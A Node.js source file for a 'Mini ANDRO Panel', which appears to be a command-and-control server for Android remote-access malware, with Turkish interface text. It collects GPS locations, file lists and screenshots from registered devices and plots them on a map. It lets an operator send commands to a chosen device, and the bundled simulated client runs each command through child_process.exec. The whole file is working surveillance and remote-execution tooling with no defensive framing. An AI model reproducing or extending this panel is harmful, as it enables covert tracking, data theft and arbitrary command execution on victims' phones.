// andro_panel_beautiful.js
const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const bodyParser = require('body-parser');
const { exec } = require('child_process');

const PORT = process.argv[2] || 9400;
const ADMIN_TOKEN = Math.random().toString(36).slice(2,18);

let clients = {}; // { socketId: { device_name, gps, logs, files, screenshots } }

app.use(bodyParser.json());
app.use(express.static(__dirname));
app.set('view engine','ejs');
app.set('views', __dirname);

function checkToken(req,res,next){
    if(req.query.token===ADMIN_TOKEN) next();
    else res.status(401).send("Unauthorized");
}

app.get('/',(req,res)=>{
    res.send(`<h2>Mini ANDRO Panel</h2>
    <p>Panel: <a href="/panel?token=${ADMIN_TOKEN}">/panel</a></p>
    <p>Port: ${PORT}</p>`);
});

app.get('/panel', checkToken, (req,res)=>{
    let clientData = JSON.stringify(clients);
    res.send(`
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Mini ANDRO Panel</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet">
<script src="/socket.io/socket.io.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
<style>
body{font-family:Arial;margin:20px;}
#map{height:300px;margin-bottom:20px;}
.card{margin-bottom:15px;}
</style>
</head>
<body class="container">
<h2 class="my-3">Mini ANDRO Panel</h2>
<div id="map"></div>
<div id="deviceCards" class="row"></div>
<canvas id="clientChart" width="400" height="150"></canvas>

<script>
const socket=io();
let clients=${clientData};

function renderCards(clients){
    let html='';
    for(let id in clients){
        const c=clients[id];
        html+=\`
        <div class="col-md-4">
            <div class="card">
                <div class="card-body">
                    <h5 class="card-title">\${c.device_name}</h5>
                    <p>GPS: \${c.gps || 'N/A'}</p>
                    <p>Komut Sayısı: \${c.logs.length}</p>
                    <p>Dosya Sayısı: \${c.files?.length || 0}</p>
                    <p>Screenshot: \${c.screenshots?.length || 0}</p>
                </div>
            </div>
        </div>\`;
    }
    document.getElementById('deviceCards').innerHTML=html;
}

renderCards(clients);

// Grafik
const ctx=document.getElementById('clientChart').getContext('2d');
const chart=new Chart(ctx,{
    type:'bar',
    data:{
        labels:Object.keys(clients),
        datasets:[{
            label:'Komut Sayısı',
            data:Object.values(clients).map(c=>c.logs.length),
            backgroundColor:'rgba(54,162,235,0.6)'
        }]
    },
    options:{responsive:true,scales:{y:{beginAtZero:true}}}
});

// Harita
const map=L.map('map').setView([0,0],1);
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
    attribution:'&copy; OpenStreetMap contributors'
}).addTo(map);
const markers={};

function updateMarkers(){
    for(let id in clients){
        if(clients[id].gps){
            let coords=clients[id].gps.split(',');
            let lat=parseFloat(coords[0]);
            let lng=parseFloat(coords[1]);
            if(markers[id]){
                markers[id].setLatLng([lat,lng]);
            }else{
                markers[id]=L.marker([lat,lng]).addTo(map).bindPopup(clients[id].device_name);
            }
        }
    }
}

updateMarkers();

socket.on('updateClients', data=>{
    clients=data;
    renderCards(clients);
    chart.data.labels=Object.keys(clients);
    chart.data.datasets[0].data=Object.values(clients).map(c=>c.logs.length);
    chart.update();
    updateMarkers();
});
</script>
</body>
</html>
`);
});

// SOCKET.IO
io.on('connection', socket=>{
    console.log('Yeni bağlantı:',socket.id);

    socket.on('register', data=>{
        clients[socket.id]={ device_name:data.device_name, gps:null, logs:[], files:[], screenshots:[] };
        io.emit('updateClients',clients);
    });

    socket.on('gps', gps=>{
        if(clients[socket.id]) clients[socket.id].gps=gps;
        io.emit('updateClients',clients);
    });

    socket.on('command', ({targetId, command})=>{
        if(clients[targetId]){
            io.to(targetId).emit('execute', command);
            clients[targetId].logs.push(command);
        }
    });

    socket.on('files', files=>{
        if(clients[socket.id]) clients[socket.id].files=files;
        io.emit('updateClients',clients);
    });

    socket.on('screenshot', screenshots=>{
        if(clients[socket.id]) clients[socket.id].screenshots=screenshots;
        io.emit('updateClients',clients);
    });

    socket.on('disconnect', ()=>{
        delete clients[socket.id];
        io.emit('updateClients',clients);
    });
});

// CLIENT SIMÜLASYONU
const ioClient=require('socket.io-client');
const clientSocket=ioClient.connect(`http://localhost:${PORT}`);

clientSocket.on('connect', ()=>{
    console.log('Client servera bağlandı:',clientSocket.id);
    clientSocket.emit('register',{device_name:'Test Telefon'});

    setInterval(()=>{
        const lat=(Math.random()*180-90).toFixed(5);
        const lng=(Math.random()*360-180).toFixed(5);
        clientSocket.emit('gps',`${lat},${lng}`);
    },10000);

    clientSocket.emit('files',['file1.txt','file2.txt']);
    clientSocket.emit('screenshot',['ss1.png','ss2.png']);
});

clientSocket.on('execute', cmd=>{
    console.log('Komut alındı:',cmd);
    exec(cmd,(err,stdout,stderr)=>{
        if(stdout) console.log('STDOUT:',stdout);
        if(stderr) console.log('STDERR:',stderr);
    });
});

http.listen(PORT,()=>console.log(\`Mini ANDRO panel çalışıyor: http://127.0.0.1:\${PORT}\`));